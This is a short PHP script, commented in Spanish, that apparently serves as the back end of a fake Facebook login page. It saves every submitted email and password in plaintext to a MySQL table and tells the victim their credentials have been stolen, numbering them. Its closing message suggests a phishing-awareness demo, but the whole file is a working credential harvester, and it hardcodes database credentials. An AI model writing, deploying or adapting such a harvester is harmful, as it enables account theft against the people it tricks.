<?php

//datos de conexion a la base de datos
$servername = "localhost";
$username = "facebook";
$password = "f4c3b00k";
$dbname = "facebook";


// Creo la conexion hacia mysql
$dsn = "mysql:host=$servername;dbname=$dbname";
$options = [
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
];
try {
    $conn = new PDO($dsn, $username, $password, $options);
} catch (PDOException $e) {
    echo "Connection failed: " . $e->getMessage();
}

// Insert user and password into "usuarios" table
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    // inserto los datos traidos del formulario en la tabla usuarios
    $sql = "INSERT INTO usuarios (email, password) VALUES (:email, :password)";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':email', $email);
    $stmt->bindParam(':password', $password);

    if ($stmt->execute()) {
        // Genero un select para traerme el total de usuarios de la tabla
        $sql = "SELECT COUNT(*) as total FROM usuarios";
        $stmt = $conn->prepare($sql);
        $stmt->execute();
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        echo "Tus credenciales han sido robadas, eres el usuario Nro: #" . $row["total"];
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
}
// cierro la conexion al motor mysql
$conn = null;
